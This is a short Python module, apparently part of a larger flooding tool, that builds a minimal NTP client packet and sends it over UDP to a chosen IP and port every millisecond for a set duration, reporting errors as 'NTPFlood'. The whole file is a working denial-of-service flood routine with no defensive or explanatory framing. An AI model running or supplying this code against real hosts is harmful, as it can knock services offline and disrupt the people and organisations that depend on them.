import socket
import time

def build_ntp_request():
    # Header: LI = 0, VN = 3, Mode = 3 (client)
    return b'\x1b' + 47 * b'\x00'

def run(ip, port, duration, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ntp_payload = build_ntp_request()
    end_time = time.time() + duration

    try:
        while not stop_event.is_set() and time.time() < end_time:
            sock.sendto(ntp_payload, (ip, port))
            time.sleep(0.001)
    except Exception as e:
        print(f"[NTPFlood Error] {e}")
    finally:
        sock.close()
